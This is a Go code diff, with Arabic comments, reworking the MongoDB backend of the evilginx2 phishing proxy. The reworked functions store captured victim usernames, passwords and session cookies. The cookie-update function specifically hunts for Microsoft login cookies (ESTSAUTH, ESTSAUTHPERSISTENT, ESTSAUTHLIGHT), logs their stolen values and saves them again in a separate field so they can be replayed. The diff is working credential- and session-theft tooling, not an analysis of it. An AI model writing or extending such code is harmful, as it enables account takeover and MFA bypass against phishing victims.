@@ -3,6 +3,7 @@ package database
 import (
 	"context"
 	"fmt"
+	"strings"
 	"time"
 
 	"github.com/kgretzky/evilginx2/log"
@@ -20,7 +21,6 @@ type MongoDatabase struct {
 	sessionsColl *mongo.Collection
 	ctx          context.Context
 	cancel       context.CancelFunc
-	dbName       string
 }
 
 // Session مع تعديلات لدعم MongoDB
@@ -41,18 +41,6 @@ type MongoSession struct {
 	CreateTime   int64                         `bson:"create_time" json:"create_time"`
 	UpdateTime   int64                         `bson:"update_time" json:"update_time"`
 	UserId       string                        `bson:"user_id" json:"user_id"`
-	
-	// إضافة الحقول الجديدة
-	CountryCode    string                               `bson:"country_code"`
-	CountryName    string                               `bson:"country_name"`
-	DeviceType     string                               `bson:"device_type"`
-	BrowserType    string                               `bson:"browser_type"`
-	BrowserVersion string                               `bson:"browser_version"`
-	OSType         string                               `bson:"os_type"`
-	OSVersion      string                               `bson:"os_version"`
-	LoginType      string                               `bson:"login_type"`
-	Has2FA         bool                                 `bson:"has_2fa"`
-	Type2FA        string                               `bson:"type_2fa"`
 }
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
@@ -118,7 +106,6 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 		sessionsColl: sessionsColl,
 		ctx:          background,
 		cancel:       cancel,
-		dbName:       dbName,
 	}, nil
 }
 
@@ -160,16 +147,6 @@ func convertToMongoSession(s *Session) *MongoSession {
 		CreateTime:   s.CreateTime,
 		UpdateTime:   s.UpdateTime,
 		UserId:       s.UserId,
-		CountryCode:  s.CountryCode,
-		CountryName:  s.CountryName,
-		DeviceType:   s.DeviceType,
-		BrowserType:  s.BrowserType,
-		BrowserVersion: s.BrowserVersion,
-		OSType:       s.OSType,
-		OSVersion:    s.OSVersion,
-		LoginType:    s.LoginType,
-		Has2FA:        s.Has2FA,
-		Type2FA:       s.Type2FA,
 	}
 }
 
@@ -191,9 +168,8 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		}
 	}
 
-	// نحول ObjectID إلى int باستخدام الحقل Id من MongoSession
 	return &Session{
-		Id:           ms.Id, // استخدام ms.Id بدلاً من ms.ID (ObjectID)
+		Id:           ms.Id,
 		Phishlet:     ms.Phishlet,
 		LandingURL:   ms.LandingURL,
 		Username:     ms.Username,
@@ -208,16 +184,6 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		CreateTime:   ms.CreateTime,
 		UpdateTime:   ms.UpdateTime,
 		UserId:       ms.UserId,
-		CountryCode:  ms.CountryCode,
-		CountryName:  ms.CountryName,
-		DeviceType:   ms.DeviceType,
-		BrowserType:  ms.BrowserType,
-		BrowserVersion: ms.BrowserVersion,
-		OSType:       ms.OSType,
-		OSVersion:    ms.OSVersion,
-		LoginType:    ms.LoginType,
-		Has2FA:        ms.Has2FA,
-		Type2FA:       ms.Type2FA,
 	}
 }
 
@@ -261,50 +227,57 @@ func (m *MongoDatabase) GetLastSessionId() (int, error) {
 }
 
 // CreateSession ينشئ جلسة جديدة في MongoDB
-func (m *MongoDatabase) CreateSession(
-	sid, phishlet, landingURL, useragent, remoteAddr string,
-	countryCode, countryName string,
-	deviceType, browserType, browserVersion, osType, osVersion string,
-	loginType string, has2FA bool, type2FA string,
-) error {
-	// حصول على آخر معرف
-	lastId, err := m.GetLastSessionId()
-	if err != nil {
-		lastId = 0
-	}
+func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remoteAddr string) error {
+	log.Debug("[MongoDB] محاولة إنشاء جلسة جديدة: %s", sid)
 	
-	// إنشاء كائن MongoSession بدلاً من Session
-	mongoSession := &MongoSession{
-		ID:            primitive.NewObjectID(),
-		Id:            lastId + 1,
-		Phishlet:      phishlet,
-		LandingURL:    landingURL,
-		Username:      "",
-		Password:      "",
-		Custom:        make(map[string]string),
-		BodyTokens:    make(map[string]string),
-		HttpTokens:    make(map[string]string),
-		CookieTokens:  make(map[string]map[string]interface{}),
-		SessionId:     sid,
-		UserAgent:     useragent,
-		RemoteAddr:    remoteAddr,
-		CreateTime:    time.Now().Unix(),
-		UpdateTime:    time.Now().Unix(),
-		CountryCode:   countryCode,
-		CountryName:   countryName,
-		DeviceType:    deviceType,
-		BrowserType:   browserType,
-		BrowserVersion: browserVersion,
-		OSType:        osType,
-		OSVersion:     osVersion,
-		LoginType:     loginType,
-		Has2FA:        has2FA,
-		Type2FA:       type2FA,
+	// التحقق مما إذا كانت الجلسة موجودة بالفعل
+	var existingSession MongoSession
+	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&existingSession)
+	if err == nil {
+		log.Debug("[MongoDB] الجلسة موجودة بالفعل: %s", sid)
+		return fmt.Errorf("الجلسة موجودة بالفعل: %s", sid)
+	} else if err != mongo.ErrNoDocuments {
+		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
+		return err
 	}
 
-	// حفظ في قاعدة البيانات
-	_, err = m.sessionsColl.InsertOne(m.ctx, mongoSession)
-	return err
+	// الحصول على آخر معرف
+	lastId, err := m.GetLastSessionId()
+	if err != nil {
+		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف: %v", err)
+		return err
+	}
+	newId := lastId + 1
+	log.Debug("[MongoDB] تعيين معرف الجلسة الجديدة: %d", newId)
+
+	// إنشاء جلسة جديدة
+	now := time.Now().UTC().Unix()
+	newSession := &MongoSession{
+		Id:           newId,
+		Phishlet:     phishlet,
+		LandingURL:   landingURL,
+		Username:     "",
+		Password:     "",
+		Custom:       make(map[string]string),
+		BodyTokens:   make(map[string]string),
+		HttpTokens:   make(map[string]string),
+		CookieTokens: make(map[string]map[string]interface{}),
+		SessionId:    sid,
+		UserAgent:    useragent,
+		RemoteAddr:   remoteAddr,
+		CreateTime:   now,
+		UpdateTime:   now,
+		UserId:       "JEMEX123", // تعيين قيمة UserId الثابتة
+	}
+
+	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
+	if err != nil {
+		log.Error("[MongoDB] خطأ أثناء إدراج الجلسة: %v", err)
+		return err
+	}
+	
+	log.Debug("[MongoDB] تم إنشاء الجلسة بنجاح: %s (ID: %d)", sid, newId)
+	return nil
 }
 
 // ListSessions يجلب قائمة الجلسات من MongoDB
@@ -365,15 +338,28 @@ func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
 	return convertFromMongoSession(&mongoSession), nil
 }
 
-// UpdateSession يحدث خيارات الجلسة حسب الاسم والقيمة
-func (m *MongoDatabase) UpdateSession(sid string, optionName string, optionValue string) error {
+// UpdateSession يحدث جلسة في MongoDB
+func (m *MongoDatabase) UpdateSession(s *Session) error {
+	mongoSession := convertToMongoSession(s)
+	mongoSession.UpdateTime = time.Now().UTC().Unix()
+
+	_, err := m.sessionsColl.UpdateOne(
+		m.ctx,
+		bson.M{"id": s.Id},
+		bson.M{"$set": mongoSession},
+	)
+	return err
+}
+
+// UpdateSessionUsername يحدث اسم المستخدم للجلسة
+func (m *MongoDatabase) UpdateSessionUsername(sid, username string) error {
 	now := time.Now().UTC().Unix()
 	_, err := m.sessionsColl.UpdateOne(
 		m.ctx,
 		bson.M{"session_id": sid},
 		bson.M{
 			"$set": bson.M{
-				optionName:    optionValue,
+				"username":    username,
 				"update_time": now,
 			},
 		},
@@ -381,15 +367,15 @@ func (m *MongoDatabase) UpdateSession(sid string, optionName string, optionValue
 	return err
 }
 
-// UpdateSessionTokens يحدث كافة الرموز للجلسة
-func (m *MongoDatabase) UpdateSessionTokens(sid string, tokens map[string]map[string]string) error {
+// UpdateSessionPassword يحدث كلمة المرور للجلسة
+func (m *MongoDatabase) UpdateSessionPassword(sid, password string) error {
 	now := time.Now().UTC().Unix()
 	_, err := m.sessionsColl.UpdateOne(
 		m.ctx,
 		bson.M{"session_id": sid},
 		bson.M{
 			"$set": bson.M{
-				"tokens":      tokens,
+				"password":    password,
 				"update_time": now,
 			},
 		},
@@ -397,20 +383,220 @@ func (m *MongoDatabase) UpdateSessionTokens(sid string, tokens map[string]map[st
 	return err
 }
 
-// UpdateSessionCookieTokens يحدث رمز كوكي محدد للجلسة
-func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, domain string, key string, value map[string]string) error {
+// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
+func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
 	now := time.Now().UTC().Unix()
 	_, err := m.sessionsColl.UpdateOne(
 		m.ctx,
 		bson.M{"session_id": sid},
 		bson.M{
 			"$set": bson.M{
-				fmt.Sprintf("cookie_tokens.%s.%s", domain, key): value,
-				"update_time": now,
+				fmt.Sprintf("custom.%s", name): value,
+				"update_time":                  now,
 			},
 		},
 	)
 	return err
+}
+
+// UpdateSessionCookieTokens يحدث رموز الكوكيز للجلسة
+func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
+	// طباعة معلومات تشخيصية
+	log.Debug("[MongoDB] محاولة تحديث الكوكيز للجلسة: %s", sid)
+	
+	// تسجيل عدد المجالات والكوكيز
+	totalCookies := 0
+	for domain, domainTokens := range tokens {
+		totalCookies += len(domainTokens)
+		log.Debug("[MongoDB] المجال %s يحتوي على %d كوكيز", domain, len(domainTokens))
+		
+		// طباعة تفاصيل كل كوكي في المجال
+		for name, token := range domainTokens {
+			log.Debug("[MongoDB] - الكوكي: %s = %s", name, token.Value)
+		}
+	}
+	log.Debug("[MongoDB] إجمالي عدد المجالات: %d، إجمالي عدد الكوكيز: %d", len(tokens), totalCookies)
+	
+	// البحث عن الكوكيز المهمة
+	importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT"}
+	for _, cookieName := range importantCookies {
+		found := false
+		for domain, domainTokens := range tokens {
+			for tokenName, token := range domainTokens {
+				if strings.EqualFold(tokenName, cookieName) {
+					log.Success("[MongoDB] وجدت كوكي مهم %s (اسم أصلي: %s) = %s في المجال %s", 
+						cookieName, tokenName, token.Value, domain)
+					found = true
+					break
+				}
+			}
+			if found {
+				break
+			}
+		}
+		if !found {
+			log.Warning("[MongoDB] لم يتم العثور على الكوكي المهم: %s في قائمة الكوكيز للحفظ", cookieName)
+		}
+	}
+	
+	// الحصول على الجلسة الموجودة أولاً
+	var session MongoSession
+	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&session)
+	if err != nil {
+		if err == mongo.ErrNoDocuments {
+			log.Error("[MongoDB] الجلسة غير موجودة، لا يمكن تحديث الكوكيز: %s", sid)
+			return fmt.Errorf("الجلسة غير موجودة: %s", sid)
+		}
+		log.Error("[MongoDB] خطأ أثناء استرداد الجلسة: %v", err)
+		return err
+	}
+	
+	// تحويل رموز الكوكيز إلى التنسيق المناسب لـ MongoDB
+	cookieTokens := make(map[string]map[string]interface{})
+	
+	// حفظ الكوكيز الحالية إذا كانت موجودة
+	if session.CookieTokens != nil {
+		// نسخ الكوكيز الحالية
+		for domain, domainTokens := range session.CookieTokens {
+			cookieTokens[domain] = make(map[string]interface{})
+			for name, token := range domainTokens {
+				cookieTokens[domain][name] = token
+			}
+		}
+	}
+	
+	// تحديث/إضافة الكوكيز الجديدة
+	for domain, domainTokens := range tokens {
+		if _, ok := cookieTokens[domain]; !ok {
+			cookieTokens[domain] = make(map[string]interface{})
+		}
+		
+		for name, token := range domainTokens {
+			isImportant := false
+			// التحقق مما إذا كان الكوكي مهماً
+			for _, importantName := range importantCookies {
+				if strings.EqualFold(name, importantName) {
+					isImportant = true
+					break
+				}
+			}
+			
+			// حفظ الكوكي مع قيمته
+			cookieData := map[string]interface{}{
+				"name":      token.Name,
+				"value":     token.Value,
+				"path":      token.Path,
+				"http_only": token.HttpOnly,
+			}
+			
+			// استخدام الاسم الأصلي (مع الحفاظ على حالة الأحرف) للكوكيز المهمة
+			if isImportant {
+				log.Success("[MongoDB] تحويل كوكي مهم للحفظ: %s = %s", name, token.Value)
+				cookieTokens[domain][name] = cookieData
+				
+				// أيضاً، حفظه باسم مطابق 100% للقائمة المهمة للتأكد
+				for _, importantName := range importantCookies {
+					if strings.EqualFold(name, importantName) {
+						cookieTokens[domain][importantName] = cookieData
+						log.Success("[MongoDB] تحويل كوكي مهم باسمه الأصلي: %s = %s", importantName, token.Value)
+					}
+				}
+			} else {
+				cookieTokens[domain][name] = cookieData
+			}
+		}
+	}
+	
+	// حفظ كل الكوكيز مرة واحدة
+	now := time.Now().UTC().Unix()
+	
+	update := bson.M{
+		"$set": bson.M{
+			"cookie_tokens": cookieTokens,
+			"update_time":   now,
+		},
+	}
+	
+	log.Debug("[MongoDB] محاولة تحديث الكوكيز بالتفاصيل الكاملة")
+	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
+	
+	if err != nil {
+		log.Error("[MongoDB] فشل تحديث الكوكيز: %v", err)
+		return err
+	}
+	
+	log.Success("[MongoDB] تم تحديث الكوكيز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
+	
+	// التحقق من الحفظ
+	var updatedSession MongoSession
+	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&updatedSession)
+	if err != nil {
+		log.Error("[MongoDB] فشل التحقق من الحفظ: %v", err)
+	} else {
+		// التحقق من وجود المجالات والكوكيز
+		if updatedSession.CookieTokens != nil {
+			log.Debug("[MongoDB] التحقق: تم استرداد %d مجال من الكوكيز بعد التحديث", len(updatedSession.CookieTokens))
+			
+			// طباعة محتويات الكوكيز المحفوظة
+			for domain, domainTokens := range updatedSession.CookieTokens {
+				log.Debug("[MongoDB] المجال المحفوظ: %s (عدد الكوكيز: %d)", domain, len(domainTokens))
+				
+				// البحث عن الكوكيز المهمة في البيانات المستردة
+				for tokenName, tokenValue := range domainTokens {
+					// التحقق مما إذا كان الكوكي مهماً
+					for _, importantName := range importantCookies {
+						if strings.EqualFold(tokenName, importantName) {
+							// طباعة قيمة الكوكي المهم
+							log.Success("[MongoDB] تم العثور على كوكي مهم محفوظ: %s في المجال %s", tokenName, domain)
+							// طباعة قيمة الكوكي إذا أمكن استخراجها
+							if tokenMap, ok := tokenValue.(map[string]interface{}); ok {
+								if value, hasValue := tokenMap["value"]; hasValue {
+									log.Success("[MongoDB] قيمة الكوكي المهم المحفوظ %s = %v", tokenName, value)
+								}
+							} else {
+								log.Debug("[MongoDB] نوع قيمة الكوكي: %T", tokenValue)
+							}
+						}
+					}
+				}
+			}
+		} else {
+			log.Error("[MongoDB] التحقق: CookieTokens فارغ بعد الحفظ!")
+		}
+	}
+	
+	// محاولة حفظ الكوكيز المهمة بشكل منفصل كتجربة إضافية
+	for _, cookieName := range importantCookies {
+		found := false
+		for domain, domainTokens := range tokens {
+			for tokenName, token := range domainTokens {
+				if strings.EqualFold(tokenName, cookieName) {
+					found = true
+					
+					// إنشاء حقل خاص للكوكي المهم
+					extraUpdate := bson.M{
+						"$set": bson.M{
+							fmt.Sprintf("important_cookies.%s.value", cookieName): token.Value,
+							fmt.Sprintf("important_cookies.%s.domain", cookieName): domain,
+						},
+					}
+					
+					_, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, extraUpdate)
+					if err != nil {
+						log.Error("[MongoDB] فشل حفظ الكوكي المهم %s كحقل منفصل: %v", cookieName, err)
+					} else {
+						log.Success("[MongoDB] تم حفظ الكوكي المهم %s = %s كحقل منفصل", cookieName, token.Value)
+					}
+					break
+				}
+			}
+			if found {
+				break
+			}
+		}
+	}
+	
+	return nil
 }
 
 // DeleteSessionById يحذف جلسة باستخدام المعرف العددي
@@ -475,129 +661,21 @@ func (m *MongoDatabase) SetSessionHttpTokens(sid string, tokens map[string]strin
 }
 
 // UpdateSessionUsername يحدث اسم المستخدم للجلسة
-func (m *MongoDatabase) UpdateSessionUsername(sid string, username string) error {
-	now := time.Now().UTC().Unix()
-	_, err := m.sessionsColl.UpdateOne(
-		m.ctx,
-		bson.M{"session_id": sid},
-		bson.M{
-			"$set": bson.M{
-				"username":    username,
-				"update_time": now,
-			},
-		},
-	)
-	return err
-}
-
-// UpdateSessionPassword يحدث كلمة المرور للجلسة
-func (m *MongoDatabase) UpdateSessionPassword(sid string, password string) error {
-	now := time.Now().UTC().Unix()
-	_, err := m.sessionsColl.UpdateOne(
-		m.ctx,
-		bson.M{"session_id": sid},
-		bson.M{
-			"$set": bson.M{
-				"password":    password,
-				"update_time": now,
-			},
-		},
-	)
-	return err
-}
-
-// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
-func (m *MongoDatabase) UpdateSessionCustom(sid string, name string, value string) error {
-	now := time.Now().UTC().Unix()
-	_, err := m.sessionsColl.UpdateOne(
-		m.ctx,
-		bson.M{"session_id": sid},
-		bson.M{
-			"$set": bson.M{
-				fmt.Sprintf("custom.%s", name): value,
-				"update_time":                  now,
-			},
-		},
-	)
-	return err
-}
-
-// SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
-func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	// تحويل رموز الكوكيز إلى التنسيق المناسب لـ MongoDB
-	cookieTokens := make(map[string]map[string]interface{})
-	
-	for domain, domainTokens := range tokens {
-		if _, ok := cookieTokens[domain]; !ok {
-			cookieTokens[domain] = make(map[string]interface{})
-		}
-		
-		for name, token := range domainTokens {
-			cookieData := map[string]interface{}{
-				"name":      token.Name,
-				"value":     token.Value,
-				"path":      token.Path,
-				"http_only": token.HttpOnly,
-			}
-			cookieTokens[domain][name] = cookieData
-		}
-	}
-	
-	now := time.Now().UTC().Unix()
-	
-	_, err := m.sessionsColl.UpdateOne(
-		m.ctx,
-		bson.M{"session_id": sid},
-		bson.M{
-			"$set": bson.M{
-				"cookie_tokens": cookieTokens,
-				"update_time":   now,
-			},
-		},
-	)
-	
-	return err
-}
-
-// SetupSession تقوم بإعداد جلسة كاملة مع جميع المعلومات الأساسية
-func (m *MongoDatabase) SetupSession(
-	sid string, phishlet string, username string, password string,
-	landing_url string, useragent string, remote_addr string,
-) error {
-	// إنشاء الجلسة
-	err := m.CreateSession(
-		sid, phishlet, landing_url, useragent, remote_addr,
-		"", "", // countryCode, countryName
-		"", "", "", "", "", // deviceType, browserType, browserVersion, osType, osVersion
-		"", false, "", // loginType, has2FA, type2FA
-	)
-	if err != nil {
-		return err
-	}
-
-	// تحديث اسم المستخدم وكلمة المرور
-	if err := m.SetSessionUsername(sid, username); err != nil {
-		return err
-	}
-
-	if err := m.SetSessionPassword(sid, password); err != nil {
-		return err
-	}
-
-	return nil
-}
-
-// SetSessionUsername يحدث اسم المستخدم للجلسة
 func (m *MongoDatabase) SetSessionUsername(sid string, username string) error {
 	return m.UpdateSessionUsername(sid, username)
 }
 
-// SetSessionPassword يحدث كلمة المرور للجلسة
+// UpdateSessionPassword يحدث كلمة المرور للجلسة
 func (m *MongoDatabase) SetSessionPassword(sid string, password string) error {
 	return m.UpdateSessionPassword(sid, password)
 }
 
-// SetSessionCustom يحدث بيانات مخصصة للجلسة
+// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
 func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
 	return m.UpdateSessionCustom(sid, name, value)
+}
+
+// SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
+func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
+	return m.UpdateSessionCookieTokens(sid, tokens)
 } 
